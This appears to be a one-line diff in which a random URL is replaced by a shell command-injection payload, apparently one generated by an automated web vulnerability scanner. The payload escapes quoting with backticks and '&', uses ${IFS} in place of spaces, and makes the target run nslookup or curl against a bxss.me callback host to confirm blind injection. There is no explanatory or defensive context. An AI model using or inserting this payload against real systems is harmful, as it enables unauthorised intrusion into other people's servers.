@@ -1,1 +1,1 @@
-http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg
+&(nslookup${IFS}-q${IFS}cname${IFS}hitruylfhiypn87318.bxss.me||curl${IFS}hitruylfhiypn87318.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitruylfhiypn87318.bxss.me||curl${IFS}hitruylfhiypn87318.bxss.me)&`'
